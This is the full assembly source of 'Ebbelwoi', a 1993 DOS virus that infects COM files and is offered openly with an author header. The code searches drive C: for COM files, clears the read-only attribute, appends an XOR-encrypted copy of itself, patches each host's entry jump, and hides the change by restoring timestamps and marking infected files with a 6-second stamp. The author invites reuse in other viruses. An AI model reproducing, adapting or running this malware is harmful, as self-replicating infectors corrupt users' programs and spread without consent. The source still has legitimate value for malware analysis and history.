;.............................................................................
;.                                                                           .
;.  VIRUS NAME..: [ Ebbelwoi ]                                               .
;.  TYPE........: Non-res. Parasitic COM-infector                            .
;.  AUTHOR......: (C)Sirius, 1st OCT.93, Langen(Hessen),   Germany           .
;.  DETAILS.....:                                                            .
;.                                                                           .
;.   - files only in current dir on drive C: will be infected                .
;.   - infects only files of proper length                                   .
;.   - encrypted                                                             .
;.   - gen-counter                                                           .
;.   - infects Read Only-Attributes too !                                    .
;.                                                                           .
;.                                                                           .
;.  HOW DOES THIS VIRUS WORK ? :                                             .
;. ===============================                                           .
;.   First when an infected file is executed the virus will decrypt itself   .
;.   in memory. Then it looks for an clean file in the current directory.    .
;.   The identification mark is the 6 sec. value in the file's time stamp.   .
;.   Only 'proper' files are chosen to be infected. 'Proper' means the       .
;.   length of the file must be between FIL_MIN_LEN <> FIL_MAX_LEN. The Read .
;.   Only Attribute will be ignored !                                        .
;.   After a proper file has been found its time 'n date stamp and attribute .
;.   are saved. Then the Virus makes a copy of itself near to the end of the .
;.   segment and encrypt that copy in a random way. Now encrypted it can be  .
;.   appended to the chosen file. After the virus worked hard it restores    .
;.   old time, date 'n attr. and gives the control to the programm invoked   .
;.   by DOS.                                                                 .
;.                                                                           .
;. CAUTION : THIS SOURCE-CODE MAY BE USED FOR EDUCATIONAL PURPOSES ONLY !    .
;.           NO RESPONSIBILITY WILL BE HOLD FOR ANY DAMAGE CAUSED BY STUPID  .
;.           HANDLING OF THIS PROGRAMME !!!                                  .
;.                                                                           .
;. NOTE : YOU MAY USE THIS CODE OR PARTS OF THIS CODE IN YOUR OWN PROGRAMMES .
;.        BUT SHOULD A SIGNIFICANT PART OF THIS CODE BE TAKEN TO OTHER VIRII .
;.        SO YOU MUST MENTION THE SOURCE/VIRUS NAME FROM WHICH IT HAS BEEN   .
;.        TAKEN !!!                                                          .
;.        HANDLING NOT IN ACCORDING WITH THIS NOTE OF THE AUTHOR YOU MAKES   .
;.        YOU CRIMINAL AND YOU WILL BE PUNISHED !!!                          .
;.                                                                           .
;.............................................................................

xx              equ offset s1
my_dta          equ 64100
dta_attr        equ my_dta + 15h
dta_time        equ my_dta + 16h
dta_date        equ my_dta + 18h
dta_size        equ my_dta + 1ah
dta_name        equ my_dta + 1eh
temp_time       equ 64200
temp_date       equ 64202
temp_DTA_ofs    equ 64210
temp_DTA_seg    equ 64212
temp_old_drive  equ 64220
temp_old_attr   equ 64230
v_len           equ end_mark - start
f_min_len       equ 1915
f_max_len       equ 64000
vir_enc_buf     equ 64700
new_drive       equ 2                 ;=C
addr_jmp_op     equ 64300

CODE    SEGMENT BYTE PUBLIC
        ASSUME  CS:CODE,DS:CODE,ES:CODE,SS:CODE
        ORG     100h

dummy:  jmp start                ;\ this is nfected 5bytes prog (dummy)
        int 20h                  ;/      = nop,nop,nop,int 20

start:  call s1
s1:     xchg di,si
        pop bp
        xchg si,di
        lea si,[bp+realprog-xx]
        call crypt
        jmp short realprog
crypt:  mov dl,[bp+offset en_val-xx]
        mov cx,offset end_enc-offset realprog
        mov di,si
n_loop: lodsb
        xor al,dl
        stosb
        loop n_loop
        ret

;---------------here begins encrypted code...--------------------------

realprog:
       mov ax,[bp+offset generation-xx]    ;generation counter
       inc ax
       mov [bp+offset generation-xx],ax
       push es
       mov ah,2fh
       int 21h
       mov cs:[temp_dta_ofs],bx
       mov cs:[temp_dta_seg],es
       pop es
       mov dx,my_dta
       mov ah,1ah
       int 21h
       lea si,[bp+orig_bytes-xx]             ;restore first 3bytes of prog
       mov di,100h
       cld
       movsb
       movsb
       movsb
get_drive:
       mov ah,19h                            ;save
       int 21h
       mov byte ptr cs:[temp_old_drive],al
       mov ah,0eh                            ;chose new drive
       mov dl,new_drive
       int 21h
       jc f_ff2

find_first_file:
       mov ah,04eh
       mov cx,1                              ;ALSO READ ONLY !!!!!!!!!
       lea dx,[bp+mask_com-xx]
f_ff1: int 21h
       jnc check_if_ill
f_ff2: jmp done

check_if_ill:
       mov ax,cs:[dta_size]
       cmp ax,f_max_len
       ja find_next_file
       cmp ax,f_min_len
       jb find_next_file
       mov ax,cs:[dta_time]
       and al,00011111b
       cmp al,00000011b         ;vegleichen auf sec.=6 (=3) (if healty)
       jne infect          

find_next_file:
       mov ah,3eh        ;close file   
       int 21h                            
       mov ah,4fh                                ;find next
       jmp short f_ff1
infect:
       mov ax,4300h
       mov dx,dta_name
       int 21h
       mov cs:[temp_old_attr],cx
       mov ax,4301h
       and cx,1111111111111110b                  ;only clear RO-Attribute !
       int 21h
       mov ax,3d02h                              ;open file
       mov dx,dta_name
       int 21h                           
       mov bx,ax        
       mov ax,5700h
       int 21h
       mov cs:[temp_time],cx
       mov cs:[temp_date],dx
   get_val:
       mov ah,2ch                                 ;get clock time
       int 21h
       or dl,dl                                 ; = 0 ?
       je get_val
       mov [bp+offset en_val-xx],dl
       mov ah,3fh                                ;erste 3 byt d. zuinfiz.prog
       lea dx,[bp+orig_bytes-xx]                 ;sichern
       mov cx,3
       int 21h
       mov ax,4202h                               ;pointer to EOF
       xor cx,cx
       xor dx,dx
       int 21h
       sub ax,3
       mov word ptr cs:[addr_jmp_op+1],ax       ;jmp - argument
       mov byte ptr cs:[addr_jmp_op],0E9h       ;jmp - operator
       lea si,[bp+start-xx]
       mov di,vir_enc_buf                    ;copy virus to buffer in memory
       mov cx,v_len
       cld 
       rep movsb
       mov si,vir_enc_buf + realprog - start         ;encrypt
       call crypt                                    ; it !!!
       mov ah,40h                                ;copy virus to victim file
       mov dx,vir_enc_buf
       mov cx,v_len
       int 21h
       mov ax,4200h
       xor cx,cx
       xor dx,dx
       int 21h
       mov ah,40h                             ;write new 3 bytes
       mov cx,3                               ;
       mov dx,addr_jmp_op
       int 21h

       mov ax,5701h
       mov dx,cs:[temp_date]
       mov cx,cs:[temp_time]
       and cl,11100000b
       or  cl,00000011b                                 ;set 6 sec.!!!!!!!!
       int 21h

       mov ah,3eh                                       ;close file
       int 21h

       mov ax,4301h
       mov dx,dta_name
       mov cx,cs:[temp_old_attr]
       int 21h

done:  push ds
       mov ah,1ah
       mov dx,cs:[temp_dta_ofs]
       mov ds,cs:[temp_dta_seg]
       int 21h
       pop ds

       mov ah,0eh                                       ;restore old drive
       mov dl,cs:[temp_old_drive]
       int 21h

       mov ax,0100h
       push ax
       xor ax,ax
       ret

orig_bytes    db   90h,90h,90h
mask_com      db   "*.CoM",0

;**************************************************************************
;**************************************************************************
;******** ONLY A LAMER WILL CHANGE THE TEXT BELOW AND SAY *****************
;******** EVERY PEOPLE AROUND THAT HE HAD WRITTEN THIS VIRUS ! ************
;**************************************************************************
;**************************************************************************

copyright     db   '<< Ebbelwoi >> by (�)S�R�US 10-93 D-63225'

end_enc equ $ ;-------------encrypted code ends.--------------------------

en_val        db   0                              ;XOR-encryption value
generation    dw   0                          ; generation number, not
                                              ; needed - Just for Fun  !!
end_mark equ $
CODE    ENDS
        END     dummy


;;===========================================================================
;;==============MOST GREETINGS TO ALL VIRUS WRITERS !========================
;;===========================================================================
